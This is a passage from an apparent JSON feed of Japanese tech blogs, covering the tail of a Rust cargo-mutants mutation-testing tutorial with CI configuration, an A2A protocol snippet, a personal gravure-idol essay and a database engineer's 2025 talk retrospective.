bに変更しても、最初のテストは成功してしまいます（結果を見ていないから）。これにより「このテストは意味がない」ということが明らかになります。戻り値の型別ミューテーションcargo-mutantsは、関数の戻り値の型に応じて異なるミューテーションを生成します。「型」とは何でしょうか。プログラミングにおいて、データには種類があります。「整数」「文字列」「真偽値（はい/いいえ）」などです。Rustはこの種類を厳密に区別する言語で、「この関数は整数を返す」「この関数は文字列を返す」といった宣言が必要です。cargo-mutantsは、この「返す型」に応じて、適切なミュータントを生成します。以下、Rustを知らない方にも理解できるよう、各型の意味と合わせて説明します。bool型（真偽値）bool型とは: true（真）かfalse（偽）のどちらかを表す型です。条件分岐の判定などに使われます。/// メールアドレスが有効かどうかを判定するfn is_valid_email(email: &str) -> bool {    email.contains(\'@\') && email.contains(\'.\')}生成されるミューテーション:replace is_valid_email -> bool with true - 常にtrueを返すreplace is_valid_email -> bool with false - 常にfalseを返すテストで検出すべきこと: 有効なメールと無効なメールの両方をテストして、両方のケースが正しく判定されることを確認する必要があります。i32型（符号付き整数）i32型とは: -2,147,483,648から2,147,483,647までの整数を表す型です。負の数も扱えます。/// スコアを計算する（1=合格、0=普通、-1=不合格）fn calculate_score(correct: u32, total: u32) -> i32 {    let percentage = (correct * 100) / total;    if percentage >= 80 { 1 }    else if percentage >= 50 { 0 }    else { -1 }}生成されるミューテーション:replace calculate_score -> i32 with 0 - 常に0を返すreplace calculate_score -> i32 with 1 - 常に1を返すreplace calculate_score -> i32 with -1 - 常に-1を返すテストで検出すべきこと: 各分岐（合格・普通・不合格）すべてのケースをテストする必要があります。String型（文字列）String型とは: 可変長のテキストデータを表す型です。ユーザー名やメッセージなどに使われます。/// 挨拶文を生成するfn format_greeting(name: &str) -> String {    format!(\\"Hello, {}!\\", name)}生成されるミューテーション:replace format_greeting -> String with String::new() - 空文字列を返すreplace format_greeting -> String with \\"xyzzy\\".into() - 固定文字列「xyzzy」を返す（「xyzzy」はテスト用のダミー文字列としてよく使われる伝統的な文字列です）テストで検出すべきこと: 戻り値の内容を検証することが重要です。単に「何か文字列が返ってくる」だけでなく、期待する内容かどうかを確認します。Option\\\\<T>型（値があるかないか）Option型とは: 値が「ある」か「ない」かを表す型です。Some(値)で値があることを、Noneで値がないことを表します。なぜこの表現を使うのか。多くの言語では「値がない」ことをnullで表しますが、null処理を忘れてエラーになることがよくあります。Rustでは「値がないかもしれない」ことを型で明示し、処理を強制します。これにより、nullに起因するバグを防ぎます。検索結果が見つからない場合などによく使われます。/// 最初の偶数を見つけるfn find_first_even(numbers: &[i32]) -> Option<i32> {    numbers.iter().find(|&&n| n % 2 == 0).copied()}生成されるミューテーション:replace find_first_even -> Option<i32> with None - 常に「見つからない」を返すreplace find_first_even -> Option<i32> with Some(0) - 常に「0が見つかった」を返すreplace find_first_even -> Option<i32> with Some(1) - 常に「1が見つかった」を返すテストで検出すべきこと: 「見つかる場合」と「見つからない場合」の両方をテストし、見つかった場合は正しい値が返されていることを確認します。Result\\\\<T, E>型（成功か失敗か）Result型とは: 処理が「成功」したか「失敗」したかを表す型です。Ok(値)で成功を、Err(エラー)で失敗を表します。ファイル操作やネットワーク通信など、失敗する可能性のある処理に使われます。/// 正の数をパースするfn parse_positive_number(s: &str) -> Result<u32, String> {    let n: i32 = s.parse().map_err(|_| \\"invalid number\\".to_string())?;    if n > 0 {        Ok(n as u32)    } else {        Err(\\"number must be positive\\".to_string())    }}生成されるミューテーション:replace parse_positive_number -> Result<u32, String> with Ok(0) - 常に「成功（0）」を返すreplace parse_positive_number -> Result<u32, String> with Ok(1) - 常に「成功（1）」を返すテストで検出すべきこと: 成功ケースと失敗ケースの両方をテストします。特にエラーハンドリングのテストを忘れがちなので注意が必要です。Vec\\\\<T>型（配列・リスト）Vec型とは: 同じ型の値を複数格納できる可変長の配列です。リストやコレクションを扱う場合に使われます。/// 偶数だけを抽出するfn get_even_numbers(numbers: &[i32]) -> Vec<i32> {    numbers.iter().filter(|&&n| n % 2 == 0).copied().collect()}生成されるミューテーション:replace get_even_numbers -> Vec<i32> with vec![] - 空の配列を返すreplace get_even_numbers -> Vec<i32> with vec![0] - 要素1つの配列を返すreplace get_even_numbers -> Vec<i32> with vec![1] - 要素1つの配列を返すテストで検出すべきこと: 返される配列の要素数と内容の両方を検証します。空配列が返されるケースもテストすることが重要です。演算子のミューテーションcargo-mutantsは、演算子を別の演算子に置き換えるミューテーションも生成します。比較演算子== ↔ !=    等しい ↔ 等しくない<  ↔ >     小さい ↔ 大きい<= ↔ >=    以下 ↔ 以上論理演算子&& ↔ ||    かつ ↔ または算術演算子+ ↔ - ↔ *    足し算 ↔ 引き算 ↔ 掛け算/ ↔ %        割り算 ↔ 余り単項演算子-a → a    符号反転を削除!a → a    論理否定を削除テスト不足の発見例実際にサンプルプロジェクトで検出された「missed」（テストで検出できなかったミュータント）を見てみましょう。MISSED   src/lib.rs:155:9: delete match arm 1 in calculate_discountMISSED   src/lib.rs:156:9: delete match arm 2 in calculate_discountMISSED   src/lib.rs:155:20: replace - with + in calculate_discount...これは以下のコードに対するミューテーションです。fn calculate_discount(price: u32, member_level: u32) -> u32 {    match member_level {        0 => price,                     // 割引なし        1 => price - (price / 10),     // 10% 割引        2 => price - (price / 5),      // 20% 割引        _ => price - (price / 4),      // 25% 割引    }}#[test]fn test_calculate_discount_weak() {    // member_level 0 のみテスト → 他のケースの変異を検出できない！    assert_eq!(calculate_discount(100, 0), 100);}テストがmember_level = 0のケースしかカバーしていないため、他のケース（1, 2, _）のミューテーションは検出できませんでした。これを修正するには、すべてのケースをテストする必要があります。#[test]fn test_calculate_discount_comprehensive() {    assert_eq!(calculate_discount(100, 0), 100);  // 割引なし    assert_eq!(calculate_discount(100, 1), 90);   // 10% 割引    assert_eq!(calculate_discount(100, 2), 80);   // 20% 割引    assert_eq!(calculate_discount(100, 3), 75);   // 25% 割引}設定とカスタマイズコマンドラインオプション# ファイル指定cargo mutants -f src/core.rs -f src/utils.rs# ファイル除外cargo mutants -e src/generated/*.rs# 正規表現でフィルタcargo mutants --re \\"impl Serialize\\" --exclude-re \\"impl Debug\\"# 並列実行（2-3から開始推奨）cargo mutants -j2# nextestを使用cargo mutants --test-tool=nextest# タイムアウト設定cargo mutants --timeout 300cargo mutants --timeout-multiplier 3設定ファイル（.cargo/mutants.toml）プロジェクト固有の設定を永続化できます。# .cargo/mutants.tomltest_tool = \\"nextest\\"jobs = 2timeout_multiplier = 3.0exclude_globs = [\\"src/generated/*.rs\\"]exclude_re = [\\"impl Debug\\", \\"impl Display\\"]additional_cargo_test_args = [\\"--all-targets\\"]関数単位の除外（#[mutants::skip]）特定の関数をミューテーション対象から除外できます。// Cargo.tomlに追加: mutants = \\"0.0.3\\"#[mutants::skip]  // この関数はミューテーション対象外fn should_stop() -> bool {    true  // falseに変異するとハングする}自動除外される関数以下は自動的にミューテーション対象から除外されます。#[test]属性が付いた関数#[cfg(test)]内のコードnew関数とDefault実装CI/CDパイプラインへの統合GitHub Actions基本設定name: Mutation Testingon: [push, pull_request]jobs:  cargo-mutants:    runs-on: ubuntu-latest    steps:      - uses: actions/checkout@v4      - uses: taiki-e/install-action@v2        with:          tool: cargo-mutants      - run: cargo mutants -vV --in-place      - uses: actions/upload-artifact@v4        if: always()        with:          name: mutants-out          path: mutants.outプルリクエストでの増分テスト変更されたコードのみをテストし、高速なフィードバックを実現します。- name: Generate diff  run: git diff origin/${{ github.base_ref }}.. | tee git.diff- run: cargo mutants --no-shuffle -vV --in-diff git.diffシャーディングによる分散実行大規模プロジェクトでは、複数のジョブに分割して並列実行できます。strategy:  matrix:    shard: [0, 1, 2, 3, 4, 5, 6, 7]steps:  - run: cargo mutants --shard ${{ matrix.shard }}/8 --baseline=skip --timeout 300パフォーマンス最適化ミューテーションテストは「ミュータント数 \xd7 テスト実行時間」のコストがかかります。100個のミュータントがあり、テストに1秒かかるなら、最低でも100秒かかる計算です。実際のプロジェクトでは数百〜数千のミュータントが生成されることもあり、実行時間が課題になります。テストスイートが1分以内のプロジェクトなら、数百ミュータントでも10-20分で完了します。CIで毎回実行するのは現実的でないので、増分テスト（--in-diff）で変更されたコードのみをテストし、フルテストを週次やリリース前に限定するのが実践的です。以下の最適化も効果的です。高速リンカーの使用「リンカー」とは、コンパイルされたコードを実行可能なプログラムにまとめるツールです。プログラムを作る最終段階で使われます。デフォルトのリンカーは汎用的ですが、高速化に特化したリンカーを使うとビルド時間を短縮できます。Moldリンカーで約20%の改善、Wildリンカーでは半分以下の時間になる場合もあります。専用Cargoプロファイル[profile.mutants]inherits = \\"test\\"debug = \\"none\\"並列実行の設定-j2から開始して、リソース監視しながら調整します。高すぎる値はメモリ枯渇の原因になります。RAMディスクの活用TMPDIR=/ram cargo mutants制限事項副作用のあるコードcargo-mutantsは機械生成された変更でコードをビルド・実行するため、ファイル操作や外部システムへ接続するテストでは予期しない動作を引き起こす可能性があります。フレーキーテスト「フレーキーテスト」とは、同じコードに対して実行するたびに結果が変わる不安定なテストのことです。たとえば、現在時刻に依存するテストや、外部サービスに依存するテストがこれに該当します。ミューテーションテストは「テストが失敗したか」を判定基準にするため、フレーキーテストがあると正確な結果が得られません。まずはcargo testで確実にパスする安定したテストスイートを用意してから実行してください。サポートされていないケース 制限事項            詳細                                       Cargo専用           Bazel等の他ビルドシステムは未対応          条件付きコンパイル  #[cfg(target_os = \\"linux\\")]を理解しない  マクロ生成コード    生成されたコードは変異対象外              等価ミュータントミューテーションテストには理論的な限界があります。それが「等価ミュータント」です。たとえば、x * 1をxに変えても動作は同じです。このミュータントは検出不可能ですが、missedとしてカウントされます。また、ログ出力やデバッグ用の関数を変更しても、テストが失敗しないのは正しい動作です。だから、missed率0%は現実的な目標ではない。80-90%の検出率で十分です。残りをコードレビューや手動テストで補完します。検出できないミュータントを#[mutants::skip]で除外すれば、ノイズを減らせます。まとめテストは通っていた。でも、何も守っていなかった。冒頭で触れた私の失敗は「テストが結果を検証していない」ことが原因でした。cargo-mutantsは、こうした「見せかけのテスト」を発見するツールです。あの経験がなければ、この記事を書くこともなかったでしょう。syu-m-5151.hatenablog.comミューテーションテストの価値コードカバレッジは「テストがコードを実行したか」を測りますが、「テストが正しく検証しているか」は測れません。ミューテーションテストは「テストをテストする」手法です。わざとコードを壊して、テストがそれを検出できるかを確認します。cargo-mutantsは、Rustのミューテーションテストを「誰でもすぐに試せる」ものにしたツールです。2コマンドで導入でき、ソースコードの変更は不要です。特に有効なユースケース高いコードカバレッジを達成した後の「テストは本当に機能しているか」確認CI（継続的インテグレーション）でのプルリクエストごとの増分ミューテーションテスト重要なビジネスロジックのテストギャップ発見導入のポイントcargo mutants --listでミュータント数を確認--shard 1/100で試験実行（大規模プロジェクトでは一部だけ先に試す）#[mutants::skip]と設定ファイルで偽陽性を減らすMoldリンカーと専用プロファイルでパフォーマンス最適化他の言語でのミューテーションテストこの記事ではRust用のcargo-mutantsを紹介しましたが、ミューテーションテストの考え方は言語を問わず有効です。他の言語にも同様のツールがあります。JavaScript/TypeScript: StrykerJava: PITestPython: mutmut, cosmic-rayGo: go-mutestingテストの品質を高めたいと考えている方は、ぜひお使いの言語のツールも調べてみてください。テストは通っている。でも、本当に守っているのか。ミューテーションテストは万能ではない。実行時間もかかるし、等価ミュータントの問題もある。それでも、「テストを書いた」という自己満足に気づかせてくれる。私があの日気づいたように。その問いを持ち続けることが、テストを意味のあるものにする第一歩だと思う。単体テストの考え方/使い方作者:Vladimir Khorikovマイナビ出版Amazonソフトウェアテスト徹底指南書 〜開発の高品質と高スピードを両立させる実践アプローチ作者:井芹 洋輝技術評論社Amazon【この1冊でよくわかる】ソフトウェアテストの教科書　［増補改訂 第２版］作者:布施 昌弘,江添 智之,永井 努,三堀 雅也SBクリエイティブAmazonテスト駆動開発作者:ＫｅｎｔＢｅｃｋオーム社AmazonAIとソフトウェアテスト　信頼できるシステムを構築するために作者:Adam Leon Smith,Rex Black,James Harold Davenport,Joanna Olszewska,Jeremias R\xf6\xdfler,Jonathon WrightインプレスAmazon","isoDate":"2026-01-01T23:37:35.000Z","dateMiliSeconds":1767310655000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"A2A での認証認可を理解する","link":"https://zenn.dev/satohjohn/articles/6e65b4be3f933a","contentSnippet":"概要Agent2Agent Protocol(以下A2A) は現在 Linux Foundation 傘下の AI Agent 同士のコミュニケーションを可能にする Open な Protocol です。https://github.com/a2aproject/A2Aざっくり言えば、AI Agent が外部で公開されていた際に、その AI Agent と自分が作成した AI Agent が協調して動くための仕様、例えば通信方法や要件などを決めたものです。A2A を使うと、マルチエージェントのような仕組みを作ろうとしたときに、様々な言語やフレームワーク、実行基盤で実装されてい...","isoDate":"2026-01-01T17:00:25.000Z","dateMiliSeconds":1767286825000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"2025年 個人的に心に残ったグラビアアイドル10選","link":"https://syu-m-5151.hatenablog.com/entry/2026/01/01/022147","contentSnippet":"はじめに2025年12月31日の夜、パソコンの前でこの文章を書き始めている。Xのフォロワーが1万人を超えたとき、勢いで「おすすめのグラビアを紹介します」と言ってしまった。忙しさを言い訳にして先延ばしにしていたら、年末年始になってしまった。孤独な独身男性が大晦日に書くブログがこれでいいのか。言ってしまったからには書くしかない。普段は技術ブログを書いている。ソフトウェアエンジニアとして、コードの話や設計の話をするのが本分だ。私はグラビア評論家でもなければ、業界関係者でもない。あるのは、彼女たちの作品を見て感じた個人的な感想だけだ。素人の与太話である。合わない人はブラウザバックしてもらって構わない。2025年、生成AIが生成する画像のクオリティは日に日に上がった。「人間である必要があるのか」という問いが、あらゆる領域に突きつけられている。ソフトウェアエンジニアである私も、その問いと無縁ではいられない。AIがコードを書く。AIが画像を生成する。じゃあ私たちは何をすればいいのか。答えは出ていない。そんな中で、彼女たちは諦めていなかった。生成AIには「物語」がない。挫折も、転機も、覚悟もない。彼女たちには、積み重ねてきた時間と、これから歩む道がある。同志のようなものを感じた。この記事では、そうした「代替不可能な物語」を持つ10名を紹介したい。選考基準は単純だ。心に残ったかどうか。それだけである。紹介順に優劣はない。10名のグラビアアイドル紹介菊地姫奈彼女の眼差しには、刃物のような意志と、硝子細工のような脆さが同居している。その矛盾こそが、菊地姫奈という存在を比類なきものにしている。写真集『memory』は「5年間の集大成」と銘打たれた。五年という歳月を、彼女は一冊の書物に封じ込めた。いま彼女は、女優という新たな領域へと歩を進めている。グラビアで培った肉体の言語が、演技という別の器に注がれようとしている。「集大成」とは、すなわち終焉の美学である。散り際を知る者だけが、満開の美しさを手にする。2025年、私はその花吹雪を目撃した。豊島心桜「グラビア界最強のラスボス」。この異名を耳にしたとき、私は失笑した。誇大な修辞だと高を括った。しかし彼女のグラビアを一瞥した瞬間、その異名が寸分の誇張も含まぬことを悟った。遅れて現れた者には、待たせた分だけの凄みがある。クラシックバレエで鍛えられた四肢は、舞台を離れてなお優雅な弧を描く。その肉体には規律が宿っている。女優としての道も拓きつつある彼女は、どの領域においても王者の風格を崩さぬだろう。ラスボスとは、最後に立ちはだかる者のことだ。私などは、まだその城門にすら辿り着いていない。麻倉瑞季麻倉瑞季において、知性と肉体は対立せず、むしろ共犯関係にある。豊満な曲線を誇示したかと思えば、次の瞬間には電子の戦場で剣を振るう。大学への合格、eスポーツチームへの加入。彼女はグラビアアイドルという一つの器に収まることを拒んだ。「推しのために仕事をしている」と彼女は言う。その言葉には一片の虚飾もない。欲望に忠実であることは、ときに最も誠実な生き方となる。天羽希純天羽希純との邂逅は、アイドルグループ「#2i2」を通じてであった。しかし彼女のソログラビアを目にしたとき、アイドルという名の檻では、この獣を囲い込めぬことを知った。彼女は自らを「モンスター」と称する。「アイドル界のモンスター」なるエッセイを連載し、2025年の目標を「エゴイスティックに」と宣言した。怪物とは、既存の秩序に収まらぬ者のことだ。その自覚こそが、彼女の覚悟である。「#2i2」は2025年12月に解散した。終焉へと向かう船上で、彼女はなお踊り続けた。滅びゆくものだけが放つ光がある。私はその残照に灼かれた。一ノ瀬瑠菜2007年生まれ。この事実を知ったとき、私は時の流れの残酷さを思い知った。2025年春、高校を卒業した彼女は、グラビア誌の表紙を次々と征服した。女優としての活動も始まっている。十八歳にしてこの疾走。若さとは、無限の可能性という名の空白である。まだ何者でもない。ゆえに何者にもなれる。その特権を、彼女は惜しげもなく行使している。翻って私は、何者かになれたのだろうか。その問いに答える勇気を、私はまだ持たない。溝端葵「グラビア界の超新星」。2025年、この称号を戴くに最もふさわしき者が溝端葵であった。TikTokでの舞踊が衆目を集め、スカウトの手が伸びた。2025年3月にグラビアの世界へ足を踏み入れ、わずか三ヶ月で表紙を飾るという離れ業を演じた。彗星の如き上昇である。しかし彼女には前史がある。中学三年時、「ミスセブンティーン」の最終選考に残りながら、栄冠を逃した。約十年の歳月を経て、彼女は別の扉を開いた。一度は閉ざされた道の傍らに、もう一つの道が拓けていた。迂回こそが、ときに最短距離となる。そのような物語に、私は抗えない。七瀬なな七瀬ななという存在には、終焉と黎明が同時に宿っている。レースクイーンとして頂点を極めた彼女は、2024年末にその王座を捨てた。そして2025年、女優という未踏の地へと歩み出した。デジタル写真集のタイトルは「HORIZON」。地平線とは、見えているのに決して辿り着けぬ場所のことだ。しかし彼女は、その不可能に向かって歩を進める。幼少期に習得した器械体操を武器に、アクション女優を志すという。一つの頂を極めた者だけが、別の頂への渇望を知る。終わらせる勇気を持つ者だけが、始める資格を得る。花雨「一般OL/趣味グラビア」。花雨のInstagramにはそう記されている。本業は会社員。グラビアは余技に過ぎぬ。しかしその余技に、十三万を超える眼差しが注がれている。趣味という言葉で片付けるには、あまりに多くの魂を捕らえている。彼女は自らの手で写真集を世に送り出す。五島列島の福江島で撮影された「夕星」、沖縄で撮影された「漣」。「花雨屋」なる店舗で販売されるこれらは、いかなる事務所の介在も経ぬ、純粋なる自己表現である。事務所に属さず、テレビに出ず、雑誌の表紙を飾らず。それでも彼女の作品は確かに人心を揺さぶる。職業と趣味の境界を、彼女は軽やかに踏み越える。好きだから撮る。撮りたいから撮る。その純粋さこそが、逆説的に彼女の武器となる。仕事にせぬから続けられる。仕事にしたら続けられぬ。私にも覚えがある。技術ブログを書き続けているのも、誰に頼まれたわけでもない。髙峰じゅり髙峰じゅりは、己がレズビアンであることを公言している。「十六歳で彼女を紹介したら、祖母が泣いた」と語る彼女の言葉には、幾重もの障壁を越えてきた者だけが持つ静かな強さがある。2025年、芸名を改め、新たな幕を開けた。友人と共に撮影会を興し、運営者としての貌も見せる。「グラビアは男性にしか届かぬものと思い込んでいた」と彼女は述懐する。しかし現実には、女性からの声も多く届くという。グラビアの受け手を限定せず、性を隠さず、己を偽らず。その姿勢が、従来の境界の外にいた者たちにも届いている。道を拓く者がいるから、後に続く者が歩みやすくなる。先駆者とは、常に孤独な存在である。もものすけもものすけという存在は、どこか神話的な響きを帯びている。彼女は自他ともに認める恐竜狂である。「ダイナソー」と「アイドル」を掛け合わせ「ダイナドル」の異名を持つ。グラビア、アイドル、声優。彼女の軌跡は複数の線が並走し、交錯し、ときに融合する。いずれが本業でいずれが余技か、そのような問い自体が無粋である。好むものを好むがままに追求した結果、幾つもの貌を持つに至った。2025年も彼女は止まることを知らなかった。太古の巨獣への愛を語り、信奉者と交わり、新たな地平を切り拓き続けている。「もも」が姓で「のすけ」が名であると、本人は主張している。私も「nw」が姓で「iizo」が名だ。そのような戯れを愛する心性において、私は彼女に親近を覚える。おわりに10名の物語を書き終えて、ふと思う。私は何を見ていたのだろうか。時計を見ると12時を超えていた。1月1日に何を書いているのだろう。グラビアアイドルほど自分の器とシビアに向き合っている存在はいない。年齢、体型、表現力、時代との相性。あらゆる要素が容赦なく評価される世界で、彼女たちは走り続けている。女優になりたい人がいる。声優になりたい人がいる。まだ何になりたいか決まっていない人もいる。グラビアは通過点であり、同時に今この瞬間でもある。完成された何かより、途中経過を見る方が心が動く。たぶん、私もまだ途中だからだ。生成AIがいくら精巧な画像を生成しても、そこに物語はない。挫折も、葛藤も、成長もない。彼女たちが持っているのは、代替不可能な身体と、積み重ねてきた時間と、これから歩む道だ。私も同じだ。AIがコードを書く。私もコードを書く。違いは何か。まだわからない。でも、諦めずに問い続ける人たちを見ていると、自分も諦めなくていいと思える。冒頭で「フォロワー1万人を超えた勢いで言ってしまった」と書いた。結局、年末年始に孤独な独身男性がパソコンに向かって書いている。遅れたけど、約束は守った。彼女たちにも物語があるように、私にも物語がある。技術ブログを書き、コードを書き、たまにグラビアの話をする。そういう人間として見届けてくれる人がいる。心に残ったものを素直に書いた。それでいい。2026年、彼女たちの物語は続く。私の物語も、まだ終わっていない。関連する投稿も置いておく。グラビア写真集といえば単なる視覚的刺激として消費されがちだが、そこには各グラドルの努力や作品性、女優やタレントなどを目指しながら頑張る物語、時代ごとの表現の歴史がある。こうした背景や文脈を知るとより深く面白くなる。そんな作品性と物語性を兼ね備えた魅力的な写真集4冊を紹介します。— nwiizo (@nwiizo) 2025年11月12日","isoDate":"2025-12-31T17:21:47.000Z","dateMiliSeconds":1767201707000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"2025年の振り返りをする","link":"https://nnaka2992.hatenablog.com/entry/2025/12/31/235646","contentSnippet":"みんな振り返りしてる。振り返りしてないのはお前だけ。なので振り返りします。アウトプットログ2025-1-24 3-shake SRE Tech Talk #11 オンサイト 新春OSSスペシャル 登壇2025年の外部発信はじめは所属会社である株式会社スリーシェイクの主催するイベントでした。CloudNativePGがCNCF Sandboxプロジェクトになったぞ！ 〜CloudNativePGの仕組みの紹介〜https://speakerdeck.com/nnaka2992/cloudnativepggacncf-sandboxpuroziekutoninatutazo-cloudnativepgnoshi-zu-minoshao-jieOSSスペシャルということでPostgreSQL関連のツールとして初めてCNCFプロジェクトに認定されたCloudNativePGがどのように動作しているかを掘り下げました。今年もですがここ数年は毎年、年末のセールにProxmox VM用ミニPCを購入してお家Kubernetesのセットアップをすることがルーティーンになりつつあります。そのため毎年12月から翌年4月ごろまで、DB on Kubernetesのモチベーションが高くなります。この登壇もその影響のひとつで3月ごろの登壇まではCloud Native PGに関するブログが続きました。2025-02-19 Jagu\'e\'r Cloud Native #17 ハイブリッド Meetup 登壇続くアウトプットも年末から続く個人的CloudNativePGブームに影響されたものです。Google Cloud関連のコミュニティであるJagu\'e\'rのCloud Native分科会が主催のというイベントでの登壇です。CloudNativePGを布教したい~敵「なぜCloud SQLがあるのにKubernetesでPostgreSQLをホストするのか？」~https://speakerdeck.com/nnaka2992/cloudnativepgwobu-jiao-sitaiテーマは「推しの CNCF プロジェクトを紹介するぜ LT」と言うことで当然のごとく、CloudNativePGの話をしました。CloudNativePGの特徴とデプロイ方法をともに、マネージドデータベースではなくなぜセルフホストするデータベースを選ぶのかを言及しました。2025-02-20 Kubernetes Novice Tokyo #36 登壇Jagu\'e\'r Cloud Native #17 ハイブリッド Meetupから開けて翌日の登壇でした。同僚の@bells17_さんが運営に参加するイベントです。データベースのオペレーターであるCloudNativePGがStatefulSetを使わない理由に迫るhttps://speakerdeck.com/nnaka2992/detabesunooperetadearucloudnativepggastatefulsetwoshi-wanaili-you-nipo-ru2025年前半は1か月1.5回という異常な登壇モチベーションがあったため、脊髄反射で登壇申し込みをした結果、連日の登壇になり自分の首を締めた記憶がつよいです。発表内容としてはStatefulSetという便利なKubernetesリソースがあるにも関わらず、なぜCRDでPodとPVCを管理するのかについて解説しました。2025-03-09 Jagu\'e\'r オブザーバビリティ分科会 Meetup#1 登壇Google Cloud関連のコミュニティであるJagu\'e\'rのオブザーバビリティ分科会が主催のというイベントでの登壇です。Google Cloudとo11yで実現するアプリケーション開発者主体のDB改善https://speakerdeck.com/nnaka2992/google-cloudtoo11ydeshi-xian-suruapurikesiyonkai-fa-zhe-zhu-ti-nodbgai-shanCloud SQL x Cloud Trace x OpenTelemetryという軸でアプリケーションのパフォーマンスをデータベースと透過的に見ましょうというはなしをしました。始めてでDBREについて登壇してから一環してデータベースエンジニアの手からデータベースを話し、アプリケーションエンジニアがデータベースエンジニアと同じ程度にデータベースへのモチベーションをもってほしいという気持ちがあらわれた登壇した。2025-03-11 Google CloudのTerraform職人が失職する機能が出てしまった…… ブログ2025年の数少ないブログ投稿の一つです。Google CloudでIaCをGUIで手軽に管理するためのツールの紹介をしたブログです。現時点ではまだまだ自分の方が上手くIaCでGoogle Cloudを管理できると自身を持っていえるものの、昨今発展の目覚ましい生成AIがこの機能に本格的に統合されたら飯の食い扶持が一つ減ってしまうと危機感を覚えます。2025-03-27 第52回 PostgreSQLアンカンファレンス@オンライン 登壇JPUGが主催するアンカンファレンスでの登壇です。データベースエンジニアの仕事を楽にする。PgAssistantの紹介https://speakerdeck.com/nnaka2992/tetahesuensinianoshi-shi-wole-nisuru-pgassistantnoshao-jie生成AIというものが本格的に使えるかも？ という世間の雰囲気にあてられて調査したツールでした。PgAssitsantというWebベースのツールを通して、PostgreSQLの調査に必要なデータを収集し、必要に応じて生成AIで分析を行うというツールです。はてブか何かに「楽にするではなく、奪うでは？ 」というコメントがあり、この程度で奪われたらもっと楽に仕事できているわと思った記憶があります。2025-04-17 Google Cloud Next 2025 データベースRecap ~データベース関連の全41リリースを紹介~ ブログ自社ブログでのアウトプットです。2025年のGoogle Cloud Partner Top Engineerとして2025年4月にラスベガスで開催されたGoogle Cloud Next 2025で発表されたデータベース関連のリリースをまとめて紹介したブログです。個人としても始めての海外カンファレンスの参加で、非常にモチベートされた記憶があります。2025-04-24 Next \xd7 Jagu\'e\'r アフターイベント「Next 2025 Big Thing」 登壇上記と同様にGoogle Cloud Next 2025のアウトプットの一つで、Jagu\'e\'rが主催するイベントのアフターイベントです。Google Cloud Next 2025 DM Recap ～DM領域PTEが贈る注目リリース～https://speakerdeck.com/nnaka2992/google-cloud-next-2025-dm-recap-dmling-yu-ptegazeng-ruzhu-mu-ririsuデータベース領域のGoogle Cloud Partner Top Engineerからの注目リリースを紹介しました。2025-05-14 【技術選定を突き詰める】Online Conferenc​​e 2025 登壇Findyが開催する技術選定を突き詰めるというテーマのカンファレンスの公募LT枠での登壇です。データベースの技術選定を突き詰める ～複数事例から考える最適なデータベースの選び方～https://speakerdeck.com/nnaka2992/detabesunoji-shu-xuan-ding-wotu-kijie-meru-fu-shu-shi-li-karakao-eruzui-shi-nadetabesunoxuan-bifangデータベースをどう選ぶか？ さまざまな要求があるときに、本当にその要求は必要なのか？ を問いかけ、難易度があがりやすい制約を外すことで、よりシンプルで現実的な選択肢を選ぼうという内容です。2025-05-22 JPOUG Tech Talk Night #13 登壇JPOUGが主催するテックトークイベントでの登壇です。ついに国内でも使えるようになる！～Oracle Database@Google Cloudの紹介～https://speakerdeck.com/nnaka2992/tuiniguo-nei-demoshi-eruyouninaru-oracle-database-at-google-cloudnoshao-jieGoogle Cloud Next 2025で日本のリージョンでOracle Database@Google Cloudが利用できるようになるというアナウンスにモチベートされた内容でした。Oracle Cloud InfrastructureやAWSではなく、なぜGoogle CloudでOracle Databaseがつかえることが魅力的なのかというテーマを主題でした。2025-06-06 Oracle Database＠Google Cloudの紹介～ついに日本のリージョンも使えるようになったぞ！～ ブログ自社ブログでのアウトプットです。Oracle Database@Google Cloudとはどのようなサービスなのか？ から始め、実際にどのようにデプロイできるのかを手順書チックに紹介したブログです。2025-06-30 Gemini Code Assist for GitHubでPrisma ORMのデータモデリングをレビューする ブログ自社ブログでのアウトプットです。Gemini Code Assist for GitHubを利用することでPrisma ORMのデータモデリングをレビューする知見についてまとめたブログです。いまではGoogleはGemini CLIにのりかえてしまったようで残念ですが、このブログで紹介した内容はほとんどの生成AIツールに応用可能です。2025-08-06 Google Cloud Next Tokyo 2025のパートナーブースで登壇資料としては公開していませんが、Google Cloud Next Tokyo 2025の自社ブースにて、Gemini Code Assistを利用したデータベーススキーマのPRレビューについて紹介しました。上記ブログのPrismaという軸から一般的なデータベーススキーマに焦点をひろげて紹介しました。2025-10-31 月末 Tech Lunch Online#6 - Google Cloud を語る！- 登壇2025年の登壇収めは非常にはやく、10月でした。こちらもJaguerが主催するイベントでの登壇で、Spannerとコストという軸を深掘りしました。Spannerのコストが高いの真意に迫る~ Spannerのコストの何が高いのか？ ~※ 無精のため資料非公開。そのうち公開します。よく高いといわれるSpannerですが、コストベースでみればそこまで高くありません。そんな中でイメージで語られるSpannerのコストを正確に判断するための観点を紹介しました。2025-12-16 PostgreSQLのインデックス作成におけるパラメータの影響の調査 ブログ自社とPostgreSQLのアドベントカレンダーでクロスポストしたブログ記事です。仕事でPostgreSQLのインデックス作成パフォーマンスを説明するために、適切な資料がなく困ったため、今後困らないために記述したブログといっても差し支えないです。2025-12-31 SREとPlatform Engineeringの交差点としてのデータベースエンジニア ブログ自社のアドベントカレンダーにポストしたブログです。31日にポストしていますが、アドベントカレンダーです。DBREとして仕事している中でDBRE/SREのプラクティスだけでは不足するデータベースエンジニアが本来行うべき仕事をカバーできないという課題から、常々考えておりまた業務の中でとりくもうと試行錯誤している内容をブログとしてアウトプットしたものです。その他、おしごとのことなど今年はマネージャーだったりカンリショクだったり、ピープルマネジメントだったりと呼ばれるロールにチャレンジしました。いまだにどうすればいいか別らないことは多いものの、マネージャーはこういうことを考えて発言していたのか？ など様々な学びはありました。また昨年に引き続き、Google Cloud Partner Top Engineer 2026に選出されました。昨年は数人いたデータベース領域の選出者も今年は私だけになってしまい、非常に残念です。まとめと来年の抱負今年は竜頭蛇尾としかいいようのない一年でした。通年では16件と月一回以上のペースでアウトプットできたものの、そのほとんどは上期にかたよっており、下期は6件程度でした。来年は上期で息切れしないように継続的なアウトプットを目標としたいです。また今年はアウトプットに偏ってしまったという印象もあるため、来年はもうすこしインプットを増やしたいものです。","isoDate":"2025-12-31T14:56:46.000Z","dateMiliSeconds":1767193006000,"authorName":"NAKADATE 